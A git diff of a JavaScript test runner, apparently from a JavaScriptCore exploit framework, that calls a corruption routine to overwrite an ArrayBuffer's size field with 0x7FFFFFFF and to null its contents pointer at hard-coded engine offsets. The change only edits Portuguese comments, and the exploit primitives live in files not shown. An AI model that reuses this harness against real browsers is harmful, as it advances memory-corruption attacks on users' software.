@@ -1,7 +1,7 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-// Atualize para importar a nova função do arquivo (que pode ter sido renomeado ou refatorado)
+// A importação deve corresponder ao nome da função exportada
 import { attempt_aggressive_corruption } from './testCorruptArrayBufferAggressively.mjs'; 
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -13,7 +13,6 @@ async function runAggressiveABMetadataTests() {
     const size_offset_hex = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
     const contents_ptr_offset_hex = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
 
-    // Validar e parsear os offsets
     const size_offset = parseInt(size_offset_hex, 16);
     const contents_ptr_offset = parseInt(contents_ptr_offset_hex, 16);
 
@@ -27,8 +26,8 @@ async function runAggressiveABMetadataTests() {
     await attempt_aggressive_corruption(
         "AggroCorrupt_AB_Size_to_Large",
         size_offset, 
-        0x7FFFFFFF, // Novo tamanho grande
-        4,          // Tamanhos são geralmente 4 bytes
+        0x7FFFFFFF, 
+        4,          
         true        // is_size_corruption = true
     );
     await PAUSE_S3(MEDIUM_PAUSE_S3);
@@ -38,8 +37,8 @@ async function runAggressiveABMetadataTests() {
     await attempt_aggressive_corruption(
         "AggroCorrupt_AB_ContentsPtr_to_Null",
         contents_ptr_offset, 
-        new AdvancedInt64(0,0),   // Valor NULO para um ponteiro de 64 bits
-        8,                        // Ponteiros são 8 bytes
+        new AdvancedInt64(0,0),   
+        8,                        
         false                     // is_size_corruption = false
     );
     await PAUSE_S3(MEDIUM_PAUSE_S3);
